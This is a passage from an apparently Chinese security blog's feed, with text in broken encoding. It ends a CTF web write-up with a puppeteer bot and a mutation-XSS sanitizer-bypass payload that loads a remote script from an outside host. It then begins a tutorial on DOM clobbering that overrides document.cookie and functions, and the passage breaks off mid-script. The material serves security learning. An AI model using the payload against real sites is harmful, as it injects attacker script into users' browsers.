è½½<code>html</code>è¶…è¿‡<code>2s</code>å°±ä¼šè¿›å…¥<code>catch</code>ä»è€Œè¾“å‡º<code>flag</code>ã€‚</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">visit</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> browser<span class="token punctuation">,</span> page<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex">/^\/note\?/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">'Invalid path!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>BASE_URL <span class="token operator">+</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> FLAG<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            headless<span class="token punctuation">:</span> <span class="token string">'new'</span><span class="token punctuation">,</span>            args<span class="token punctuation">:</span> <span class="token punctuation">[</span>                <span class="token string">'--no-sandbox'</span><span class="token punctuation">,</span>                <span class="token string">'--disable-setuid-sandbox'</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            executablePath<span class="token punctuation">:</span> <span class="token string">'/usr/bin/chromium-browser'</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span> waitUntil<span class="token punctuation">:</span> <span class="token string">'domcontentloaded'</span><span class="token punctuation">,</span> timeout<span class="token punctuation">:</span> <span class="token number">2000</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">let</span> text <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            text <span class="token operator">=</span> <span class="token function">sanitize</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">waitForFunction</span><span class="token punctuation">(</span>text <span class="token operator">=</span><span class="token operator">></span> document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> timeout<span class="token punctuation">:</span> <span class="token number">2000</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>            res <span class="token operator">=</span> <span class="token string">"ByeBye!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token keyword">instanceof</span> <span class="token class-name">puppeteer<span class="token punctuation">.</span>ProtocolError</span> <span class="token operator">&amp;&amp;</span> e<span class="token punctuation">.</span>message<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'Target closed'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> res<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            res <span class="token operator">=</span> <span class="token string">"ByeBye!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token string">"ByeBye!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>payload:</code></p><pre><code>/note?text=&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;script src=&#39;https://app.requestly.io/delay/3000/https://www.squirt1e.top/&#39;&gt;&lt;/script&gt;</code></pre><h4 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h4><ol><li><a href="https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/">https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/</a></li><li><a href="https://xz.aliyun.com/t/8384">https://xz.aliyun.com/t/8384</a></li><li><a href="https://boogipop.com/2023/12/01/TPCTF%202023%20Web%20Writeup/#walk-off-the-solar-system">https://boogipop.com/2023/12/01/TPCTF%202023%20Web%20Writeup/#walk-off-the-solar-system</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> å¤ç° </tag>
            
            <tag> æ—¥å¸¸å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dom-clobberingå­¦ä¹ +XSS GAMEç®€å•é¢˜</title>
      <link href="/2023/12/03/dom-clobbering/"/>
      <url>/2023/12/03/dom-clobbering/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å¥½ä¹…æ²¡å­¦ä¹ æ–°çŸ¥è¯†äº†ï¼Œè¿™æ¬¡æ¥å­¦ä¹ ä¸‹dom-clobberingã€‚æ­£å¥½S&amp;På‘äº†ç¯‡å…³äºdom-clobberingçš„é¡¶ä¼šï¼Œä¹Ÿé¡ºå¸¦çœ‹çœ‹ã€‚ä¸è¿‡çœ‹é¡¶ä¼šå‰è¿˜æ˜¯è¦é€šè¿‡å®è·µå­¦ä¹ ä¸€ä¸‹DOMç ´åçš„åŸç†ã€‚</p></blockquote><h4 id="æ ‡ç­¾å±æ€§å¼•ç”¨"><a href="#æ ‡ç­¾å±æ€§å¼•ç”¨" class="headerlink" title="æ ‡ç­¾å±æ€§å¼•ç”¨"></a>æ ‡ç­¾å±æ€§å¼•ç”¨</h4><p>å…ˆæ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>squirt1e<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>squirtle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>squirt1e<span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>squirtle<span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>squirt1e<span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>squirtle<span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>squirt1e<span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>squirtle<span class="token punctuation">)</span><span class="token punctuation">;</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸¤ä¸ª<code>form</code>è¡¨å•ï¼Œå…¶ä¸­ä½¿ç”¨<code>document</code>å¯¹è±¡æ˜¯æ— æ³•è®¿é—®<code>id</code>å±æ€§çš„ã€‚å…¶ä»–çš„æ— è®ºæ˜¯ç›´æ¥è¾“å‡º<code>squirt1e</code>è¿˜æ˜¯é€šè¿‡<code>window</code>å¼•ç”¨éƒ½æ˜¯å¯ä»¥çš„ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701500207047.png" alt="1701500207047" width="5%" height="5%" /><p>è€Œ<code>object</code>æ ‡ç­¾å´å¯ä»¥è¢«<code>document</code>å¼•ç”¨ã€‚</p><pre class="line-numbers language-html"><code class="language-html">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jieni<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jieni123<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>jieni<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>jieni123<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>jieni<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>jieni123<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>jieni<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>jieni123<span class="token punctuation">)</span><span class="token punctuation">;</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701500511974.png" alt="1701500511974" width="5%" height="5%" /><h4 id="cookieè¦†ç›–"><a href="#cookieè¦†ç›–" class="headerlink" title="cookieè¦†ç›–"></a>cookieè¦†ç›–</h4><pre><code>document.cookievar div=document.createElement(&#39;div&#39;)div.innerHTML=&#39;&lt;img name=cookie&gt;&#39;document.body.appendChild(div)</code></pre><p>åˆ›å»ºä¸€ä¸ª<code>img</code>æ ‡ç­¾<code>name</code>ä¸º<code>cookie</code>ã€‚å› ä¸ºæˆ‘ä»¬æ˜¯é€šè¿‡<code>document.cookie</code>æ¥è·å–å½“å‰é¡µé¢çš„<code>cookie</code>çš„ï¼Œé€šè¿‡å±æ€§å¼•ç”¨çš„ç‰¹æ€§æ¥è¦†ç›–æ‰<code>document.cookie</code>ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701501208880.png" alt="1701501208880" width="5%" height="5%" /><p>æˆ‘éšä¾¿æ‰¾äº†ä¸ªç«™ç‚¹ï¼Œè¯•äº†è¯•è¿˜çœŸèƒ½è¦†ç›–ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20231202152905362.png" alt="image-20231202152905362" width="5%" height="5%" /><h4 id="è¦†ç›–å‡½æ•°"><a href="#è¦†ç›–å‡½æ•°" class="headerlink" title="è¦†ç›–å‡½æ•°"></a>è¦†ç›–å‡½æ•°</h4><p>éƒ½èƒ½è¦†ç›–å˜é‡ï¼Œé‚£è‚¯å®šèƒ½è¦†ç›–å‡½æ•°äº†ã€‚</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>body<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>appendChild<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>img</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>appendChild<span class="token punctuation">)</span><span class="token punctuation">;</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¦†ç›–æ‰<code>appendChild</code>å‡½æ•°ã€‚</p><h4 id="åˆ©ç”¨toString"><a href="#åˆ©ç”¨toString" class="headerlink" title="åˆ©ç”¨toString"></a>åˆ©ç”¨toString</h4><p>è¦†ç›–æ˜¯è¦†ç›–äº†ï¼Œä½†æ˜¯è¦†ç›–ä¸ªæ ‡ç­¾ä¹Ÿæ²¡å•¥ç”¨ã€‚æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°é‡å†™äº†<code>toString</code>æ–¹æ³•çš„æ ‡ç­¾è¿›è¡Œåˆ©ç”¨ï¼Œè¿™æ ·å°±æ˜¯å­—ç¬¦ä¸²äº†ã€‚</p><pre><code>Object.getOwnPropertyNames(window).filter(p =&gt; p.match(/Element$/)).map(p =&gt; window[p]).filter(p =&gt; p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== Object.prototype.toString)</code></pre><p>æ‰¾åˆ°äº†aä»¥åŠareaæ ‡ç­¾ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701505033603.png" alt="1701505033603" width="5%" height="5%" /><p><code>alert</code>ä¼šæŠŠå‚æ•°è½¬æˆå­—ç¬¦ä¸²ã€‚</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>area</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mailto:alert(123)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>area</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">alert</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701505833826.png" alt="1701505833826" width="5%" height="5%" /><h4 id="é›†åˆå–å€¼"><a href="#é›†åˆå–å€¼" class="headerlink" title="é›†åˆå–å€¼"></a>é›†åˆå–å€¼</h4><p>çœ‹åˆ°è¿™é‡Œçš„åŒå­¦å¯èƒ½ä¼šæœ‰ä¸€äº›æƒ³æ³•ï¼Œæ¯”å¦‚è¿™ç§åµŒå¥—æ ‡ç­¾æ˜¯å¦ä¹Ÿå¯ä»¥æ‰“ã€‚</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>area</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>abcd<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>aaaa:123123<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>area</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">alert</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>abcd<span class="token punctuation">)</span><span class="token punctuation">;</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®é™…ä¸Šè¿™æ ·æ˜¯ä¸è¡Œçš„</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701506583040.png" alt="1701506583040" width="5%" height="5%" /><p>ç»†å¿ƒçš„å°ä¼™ä¼´å‘ç°æˆ‘åœ¨è¦†ç›–å‡½æ•°ä¸­ç”¨åˆ°äº†è¿™æ ·çš„åµŒå¥—æ–¹å¼ã€‚ä½†æ˜¯æˆ‘å°è¯•äº†å‡ ä¸ªæ ‡ç­¾å‘ç°åªæœ‰<code>img</code>æ‰å¯ä»¥å–åˆ°å€¼ï¼Œè¿™æ­£æ˜¯åé¢å±‚çº§å…³ç³»æå–åˆ°çš„ä¸€ç§æƒ…å†µã€‚è€Œèƒ½å¤Ÿåˆ©ç”¨<code>toString</code>çš„<code>a,area</code>éƒ½ä¸å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼å–å€¼ã€‚</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>body<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>appendChild<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>img</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>appendChild<span class="token punctuation">)</span><span class="token punctuation">;</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è€Œé€šè¿‡æ„é€ ä¸¤ä¸ª<code>id</code>ç›¸åŒçš„åµŒå¥—æ ‡ç­¾ï¼Œåˆ¶ä½œæˆé›†åˆçš„å½¢å¼ï¼Œå†é€šè¿‡<code>name</code>æ¥è¿›è¡Œå–å€¼æ˜¯èƒ½å¤Ÿå–åˆ°çš„ã€‚</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>abcd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>area</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>abcd<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>squirt1e<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>aaaa:123123<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>area</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>abcd<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">alert</span><span class="token punctuation">(</span>abcd<span class="token punctuation">.</span>squirt1e<span class="token punctuation">)</span><span class="token punctuation">;</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701506974932.png" width="5%" height="5%" /><h4 id="å±‚çº§å…³ç³»å–å€¼"><a href="#å±‚çº§å…³ç³»å–å€¼" class="headerlink" title="å±‚çº§å…³ç³»å–å€¼"></a>å±‚çº§å…³ç³»å–å€¼</h4><p>ç”¨è¿™ä¸ªè„šæœ¬ï¼Œæ€è·¯å°±æ˜¯éå†æ ‡ç­¾ï¼Œçœ‹å“ªä¸ªæ ‡ç­¾å±‚çº§ç»„åˆèƒ½é€šè¿‡<code>a.b</code>çš„å½¢å¼å–åˆ°å€¼ã€‚</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            html<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'hr'</span><span class="token punctuation">,</span> <span class="token string">'pre'</span><span class="token punctuation">,</span> <span class="token string">'blockquote'</span><span class="token punctuation">,</span> <span class="token string">'ol'</span><span class="token punctuation">,</span> <span class="token string">'ul'</span><span class="token punctuation">,</span> <span class="token string">'li'</span><span class="token punctuation">,</span> <span class="token string">'dl'</span><span class="token punctuation">,</span> <span class="token string">'dt'</span><span class="token punctuation">,</span> <span class="token string">'dd'</span><span class="token punctuation">,</span> <span class="token string">'figure'</span><span class="token punctuation">,</span> <span class="token string">'figcaption'</span><span class="token punctuation">,</span> <span class="token string">'div'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> 